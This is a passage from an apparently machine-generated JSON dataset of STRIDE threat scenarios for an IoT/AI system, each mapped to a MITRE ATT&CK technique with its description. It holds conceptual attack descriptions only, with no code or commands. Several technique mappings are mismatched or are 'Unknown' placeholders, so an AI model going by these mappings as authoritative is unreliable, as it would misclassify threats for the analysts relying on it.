                "credential theft",
                "traceability failure",
                "action denial"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is exposed through an unpatched vulnerability in a data repository.",
            "Assumptions": [
                {
                    "Assumption": "Known vulnerability exists and is unpatched.",
                    "Role": "System Administrator",
                    "Condition": "Delayed application of security patches."
                },
                {
                    "Assumption": "Sensitive data stored without encryption.",
                    "Role": "System Designer",
                    "Condition": "Data at rest is not encrypted."
                },
                {
                    "Assumption": "Publicly accessible data repository.",
                    "Role": "System Administrator",
                    "Condition": "Repository exposed to the internet."
                }
            ],
            "Potential Impact": "Data breach, loss of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data exposure",
                "vulnerability exploitation",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unsecured communication between sensors and actuators leads to interception and disclosure of data.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Use of unencrypted protocols between components."
                },
                {
                    "Assumption": "Attacker can intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Proximity to the network or capabilities for network interception."
                },
                {
                    "Assumption": "Sensitive data not obfuscated.",
                    "Role": "System Designer",
                    "Condition": "Data transmitted in clear text."
                }
            ],
            "Potential Impact": "Data interception, confidentiality breach.",
            "MITRE ATT&CK Keywords": [
                "interception",
                "unencrypted communication",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Web application vulnerability leads to unauthorized access and disclosure of user profiles.",
            "Assumptions": [
                {
                    "Assumption": "Weakness in web application security controls.",
                    "Role": "System Designer",
                    "Condition": "Use of outdated or vulnerable web frameworks."
                },
                {
                    "Assumption": "Sensitive user profiles stored without strong access controls.",
                    "Role": "System Designer",
                    "Condition": "Lack of access management policies."
                },
                {
                    "Assumption": "Publicly accessible web application.",
                    "Role": "System Administrator",
                    "Condition": "Web application exposed to the internet."
                }
            ],
            "Potential Impact": "Privacy breach, unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "web vulnerability",
                "data leakage",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack targeting the communication infrastructure disrupts system operations.",
            "Assumptions": [
                {
                    "Assumption": "Communication infrastructure susceptible to high traffic.",
                    "Role": "System Designer",
                    "Condition": "Absence of DDoS mitigation measures."
                },
                {
                    "Assumption": "Multiple compromised devices available to an attacker.",
                    "Role": "Attacker",
                    "Condition": "Access to botnet resources."
                },
                {
                    "Assumption": "Critical system components are dependent on network availability.",
                    "Role": "System Designer",
                    "Condition": "Centralized network dependencies."
                }
            ],
            "Potential Impact": "Service disruption, availability loss.",
            "MITRE ATT&CK Keywords": [
                "ddos attack",
                "network flooding",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Intentional jamming of wireless frequencies disrupts communication between IoT components.",
            "Assumptions": [
                {
                    "Assumption": "Wireless signals can be easily jammed.",
                    "Role": "System Designer",
                    "Condition": "Use of common wireless frequencies without jamming resistance."
                },
                {
                    "Assumption": "Attacker is in close proximity to the network.",
                    "Role": "Attacker",
                    "Condition": "Physical presence in the operating environment."
                },
                {
                    "Assumption": "No alternative communication channels available.",
                    "Role": "System Designer",
                    "Condition": "Lack of redundant communication pathways."
                }
            ],
            "Potential Impact": "Service disruption, communication breakdown.",
            "MITRE ATT&CK Keywords": [
                "signal jamming",
                "wireless disruption",
                "service interruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "High-volume traffic targeting data repositories leads to resource exhaustion and system unavailability.",
            "Assumptions": [
                {
                    "Assumption": "Data repository lacks rate limiting.",
                    "Role": "System Designer",
                    "Condition": "Absence of traffic throttling mechanisms."
                },
                {
                    "Assumption": "Attacker can generate substantial traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to tools capable of generating high traffic volume."
                },
                {
                    "Assumption": "No load balancing mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Centralized data repository with single point of failure."
                }
            ],
            "Potential Impact": "Resource exhaustion, service unavailability.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "high-volume traffic",
                "system downtime"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A vulnerability in the system software allows an attacker to escalate privileges and gain administrator access.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerability in software codebase.",
                    "Role": "System Designer",
                    "Condition": "Use of outdated or improperly secured software."
                },
                {
                    "Assumption": "Attacker has initial access to the system.",
                    "Role": "Attacker",
                    "Condition": "Existing unauthorized access through compromised credentials."
                },
                {
                    "Assumption": "Lack of privilege segregation.",
                    "Role": "System Administrator",
                    "Condition": "Absence of role-based access control."
                }
            ],
            "Potential Impact": "Full system compromise, data integrity breach.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "administrative access",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a misconfiguration in user devices\u2019 permissions to gain elevated access privileges.",
            "Assumptions": [
                {
                    "Assumption": "Misconfigured device permissions.",
                    "Role": "User",
                    "Condition": "Unintentional setting of broad permissions."
                },
                {
                    "Assumption": "Attacker has access to user devices.",
                    "Role": "Attacker",
                    "Condition": "Device physical access or remote control."
                },
                {
                    "Assumption": "Inadequate monitoring of user privileges.",
                    "Role": "System Administrator",
                    "Condition": "No regular review of user permissions."
                }
            ],
            "Potential Impact": "Unauthorized access, data manipulation.",
            "MITRE ATT&CK Keywords": [
                "permission misconfiguration",
                "privilege elevation",
                "unauthorized actions"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of a zero-day vulnerability in the AI/ML models used by the system allows for arbitrary code execution with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Zero-day vulnerability in AI/ML model.",
                    "Role": "System Designer",
                    "Condition": "Unpatched model with known exploit."
                },
                {
                    "Assumption": "Attacker has knowledge of the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Access to exploit details and tools."
                },
                {
                    "Assumption": "Model runs with elevated privileges.",
                    "Role": "System Administrator",
                    "Condition": "AI/ML processes operating with high-level permissions."
                }
            ],
            "Potential Impact": "Code execution, full system compromise.",
            "MITRE ATT&CK Keywords": [
                "zero-day exploit",
                "arbitrary code execution",
                "model compromise"
            ],
            "mitre_technique": {
                "name": "Exploitation for Client Execution",
                "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
                "technique_id": "T1203"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "12",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access to the system by replicating a user's biometric data.",
            "Assumptions": [
                {
                    "Assumption": "The system relies on biometric data for user authentication.",
                    "Role": "System",
                    "Condition": "When a user attempts to log in."
                },
                {
                    "Assumption": "The attacker has access to the user's biometric data.",
                    "Role": "Attacker",
                    "Condition": "Where biometric data is compromised or leaked."
                },
                {
                    "Assumption": "The attacker's device is capable of mimicking biometric data.",
                    "Role": "Attacker's Device",
                    "Condition": "If the attacker has sophisticated equipment."
                }
            ],
            "Potential Impact": "Compromise of system confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "biometric authentication",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a phishing email to trick a user into giving up their password.",
            "Assumptions": [
                {
                    "Assumption": "Users have access to email accounts and frequently check emails.",
                    "Role": "User",
                    "Condition": "During regular communication activities."
                },
                {
                    "Assumption": "The attacker can craft a convincing phishing email.",
                    "Role": "Attacker",
                    "Condition": "When the attacker has sufficient information to craft an email."
                },
                {
                    "Assumption": "The user does not have robust email security measures in place.",
                    "Role": "User",
                    "Condition": "If the user is unaware or unable to detect phishing attempts."
                }
            ],
            "Potential Impact": "Unauthorized access leading to data breaches.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "email compromise",
                "credential harvesting"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and replicates hardware token communication.",
            "Assumptions": [
                {
                    "Assumption": "The system uses hardware tokens for authentication.",
                    "Role": "System",
                    "Condition": "During the authentication process."
                },
                {
                    "Assumption": "The communication between hardware tokens and the system occurs over wireless channels.",
                    "Role": "System",
                    "Condition": "During token verification."
                },
                {
                    "Assumption": "The attacker has the capability to intercept and replicate wireless signals.",
                    "Role": "Attacker",
                    "Condition": "If equipped with relevant interception tools."
                }
            ],
            "Potential Impact": "Unauthorized access and potential system disruption.",
            "MITRE ATT&CK Keywords": [
                "token spoofing",
                "signal interception",
                "wireless communication attack"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampering with sensor data to mislead the system\u2019s decision-making process.",
            "Assumptions": [
                {
                    "Assumption": "Sensors communicate data to a central system.",
                    "Role": "System",
                    "Condition": "During normal operation."
                },
                {
                    "Assumption": "The transmitted data is not encrypted.",
                    "Role": "System",
                    "Condition": "If encryption is not implemented."
                },
                {
                    "Assumption": "The attacker can access the communication channel.",
                    "Role": "Attacker",
                    "Condition": "When close enough to intercept the signal."
                }
            ],
            "Potential Impact": "Compromise of system integrity and possibly availability.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "sensor manipulation",
                "wireless communication attack"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--276165c7-6dae-44cd-ad2d-69fc66e320f5",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the machine learning models to produce erroneous outputs.",
            "Assumptions": [
                {
                    "Assumption": "The machine learning models are accessible for updates.",
                    "Role": "System",
                    "Condition": "During maintenance or update cycles."
                },
                {
                    "Assumption": "The attacker has inside knowledge of the model structure.",
                    "Role": "Attacker",
                    "Condition": "If the attacker is a former employee or collaborator."
                },
                {
                    "Assumption": "There is inadequate monitoring of model integrity.",
                    "Role": "System",
                    "Condition": "During routine operation without checks."
                }
            ],
            "Potential Impact": "Misleading system behavior and loss of user trust.",
            "MITRE ATT&CK Keywords": [
                "model poisoning",
                "machine learning attack",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to an actuator and modifies its firmware.",
            "Assumptions": [
                {
                    "Assumption": "The actuator firmware is upgradable via physical ports.",
                    "Role": "System",
                    "Condition": "During maintenance or upgrades."
                },
                {
                    "Assumption": "The physical security of the actuator is weak.",
                    "Role": "System",
                    "Condition": "In unsecured environments."
                },
                {
                    "Assumption": "The attacker has the tools needed to modify the firmware.",
                    "Role": "Attacker",
                    "Condition": "If equipped with relevant tools and software."
                }
            ],
            "Potential Impact": "Potential safety risks and system disruption.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "physical access",
                "device manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having made changes to system configurations.",
            "Assumptions": [
                {
                    "Assumption": "System logs are not tamper-proof or properly monitored.",
                    "Role": "System",
                    "Condition": "During normal operation."
                },
                {
                    "Assumption": "User authentication details could be shared or compromised.",
                    "Role": "User",
                    "Condition": "Under circumstances of credential sharing or theft."
                },
                {
                    "Assumption": "System lacks proper non-repudiation mechanisms.",
                    "Role": "System",
                    "Condition": "In the absence of cryptographic signatures or timestamps."
                }
            ],
            "Potential Impact": "Issues in accountability and system integrity.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "non-repudiation",
                "credential sharing"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker exploiting insufficient logging mechanisms to perform unauthorized actions without being traced.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanism is improperly configured or disabled.",
                    "Role": "System",
                    "Condition": "During operation without stringent settings."
                },
                {
                    "Assumption": "The attacker can gain access without triggering alerts.",
                    "Role": "Attacker",
                    "Condition": "During low visibility periods or using covert methods."
                },
                {
                    "Assumption": "There is no regular audit of system logs.",
                    "Role": "System",
                    "Condition": "Where compliance checks are lax or non-existent."
                }
            ],
            "Potential Impact": "Lack of traceability and accountability, leading to undetected breaches.",
            "MITRE ATT&CK Keywords": [
                "unauthorized access",
                "log manipulation",
                "audit evasion"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A service provider disowns responsibility for a data breach citing the absence of explicit usage logs.",
            "Assumptions": [
                {
                    "Assumption": "Usage logs are not maintained or are incomplete.",
                    "Role": "Service Provider",
                    "Condition": "During regular operation without full logging."
                },
                {
                    "Assumption": "Provider\u2019s policy does not mandate extensive logging.",
                    "Role": "Service Provider",
                    "Condition": "If policies overlook detailed logging."
                },
                {
                    "Assumption": "Incident investigation relies heavily on available logs.",
                    "Role": "Incident Response Team",
                    "Condition": "During post-incident analysis."
                }
            ],
            "Potential Impact": "Data integrity and responsibility challenges.",
            "MITRE ATT&CK Keywords": [
                "data logging",
                "incident response",
                "policy loophole"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data between sensors and data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Data transmitted from sensors is not encrypted.",
                    "Role": "System",
                    "Condition": "During routine transmission cycles."
                },
                {
                    "Assumption": "The communication channels can be accessed by unauthorized third parties.",
                    "Role": "Attacker",
                    "Condition": "When close enough to intercept."
                },
                {
                    "Assumption": "There is no network segmentation to isolate sensitive data streams.",
                    "Role": "System",
                    "Condition": "During network design and implementation phases."
                }
            ],
            "Potential Impact": "Compromise of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted transmission",
                "network eavesdropping"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A database breach leading to exposure of sensitive user information.",
            "Assumptions": [
                {
                    "Assumption": "User information is stored in databases without strong encryption.",
                    "Role": "System",
                    "Condition": "During storage phases."
                },
                {
                    "Assumption": "Access controls to databases are not robust.",
                    "Role": "System",
                    "Condition": "During regular access management cycles."
                },
                {
                    "Assumption": "The attacker is capable of exploiting database vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "If known vulnerabilities exist."
                }
            ],
            "Potential Impact": "Exposure of sensitive user information and possible identity theft.",
            "MITRE ATT&CK Keywords": [
                "database breach",
                "data leakage",
                "user information exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Leakage of AI/ML model data due to exposed API endpoints.",
            "Assumptions": [
                {
                    "Assumption": "API endpoints are exposed without proper access controls.",
                    "Role": "System",
                    "Condition": "During public API access."
                },
                {
                    "Assumption": "Sensitive model data is accessible via these endpoints.",
                    "Role": "System",
